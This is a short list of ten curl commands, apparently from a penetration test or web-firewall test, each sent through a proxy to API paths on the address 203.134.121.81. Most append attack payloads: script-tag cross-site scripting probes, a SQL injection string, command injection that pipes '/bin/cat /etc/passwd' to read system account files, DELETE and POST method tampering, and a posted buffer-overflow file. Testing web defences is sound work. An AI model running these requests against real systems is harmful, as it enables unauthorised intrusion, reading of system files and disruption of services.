curl -k -H "Content-Type: application/json" --proxy 10.5.0.98:5566 https://203.134.121.81/ip"<script>alert(1)</script>"
curl -k -H "Content-Type: application/json" --proxy 10.5.0.98:5566 https://203.134.121.81/header"<script>alert(1)</script>"
curl -k -H "Content-Type: application/json" --proxy 10.5.0.98:5566 https://203.134.121.81/api/user-agent"<script>alert(1)</script>"
curl -k -H "Content-Type: application/json" --proxy 10.5.0.98:5566 https://203.134.121.81/api/user-agent?"' OR 1=1#"
curl -k -H "Content-Type: application/json" --proxy 10.5.0.98:5566 https://203.134.121.81/api/user-agent?"page=test|/bin/cat%20/etc/passwd"
curl -k -H "Content-Type: application/json" --proxy 10.5.0.98:5566 https://203.134.121.81/api/header?"page=test|/bin/cat%20/etc/passwd"
curl -k -H "Content-Type: application/json" --proxy 10.5.0.98:5566 https://203.134.121.81/api/header
curl -k -H "Content-Type: application/json" --proxy 10.5.0.98:5566 https://203.134.121.81/ip -X DELETE
curl -k -H "Content-Type: application/json" --proxy 10.5.0.98:5566 https://203.134.121.81/ip -X POST
curl -k -H "Content-Type: application/json" --proxy 10.5.0.98:5566 https://203.134.121.81/response-headers -X POST -d @bufferoverflow.txt

